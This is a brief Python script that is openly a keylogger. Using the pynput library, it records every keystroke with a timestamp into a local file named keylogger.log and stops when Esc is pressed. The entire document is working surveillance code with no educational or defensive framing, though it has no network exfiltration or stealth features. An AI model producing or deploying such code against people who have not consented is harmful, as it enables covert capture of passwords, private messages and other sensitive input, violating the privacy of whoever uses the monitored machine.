import logging
from pynput import keyboard

# Set up the log file to store the keystrokes
log_file = "keylogger.log"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log each key pressed
def on_press(key):
    try:
        logging.info(str(key.char)) 
    except AttributeError:
        logging.info(str(key))      


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener (Optional, typically used to stop logging with a key press)
        return False

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
